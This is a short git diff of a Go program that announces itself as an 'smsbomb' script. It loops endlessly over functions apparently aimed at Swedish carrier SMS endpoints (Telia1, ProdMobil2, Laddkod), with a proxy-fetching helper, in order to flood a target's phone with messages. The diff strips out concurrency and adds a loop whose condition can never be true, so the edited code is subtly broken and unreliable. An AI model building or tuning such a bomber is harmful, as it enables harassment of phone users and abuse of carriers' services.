@@ -8,7 +8,6 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
-	"time"
 
 	"github.com/valyala/fasthttp"
 )
@@ -19,10 +18,9 @@ func main() {
 
 	fmt.Println("loading sms :: atomic/scripts/smsbomb")
 	for {
-		go StartALL()
-		go StartALL()
-		go StartALL()
-		time.Sleep(time.Millisecond * 1)
+		StartALL()
+		StartALL()
+		StartALL()
 	}
 }
 
@@ -46,15 +44,18 @@ func fetchProxies(uri string) []string {
 
 func StartALL() {
 
-	go func() {
-		Telia1()
-	}()
-	go func() {
-		ProdMobil2()
-	}()
-	go func() {
-		Laddkod()
-	}()
+	for i := 5; i < 0; i++ {
+		go func() {
+			Telia1()
+		}()
+		go func() {
+			ProdMobil2()
+		}()
+		go func() {
+			Laddkod()
+		}()
+
+	}
 }
 func Telia1() {
 
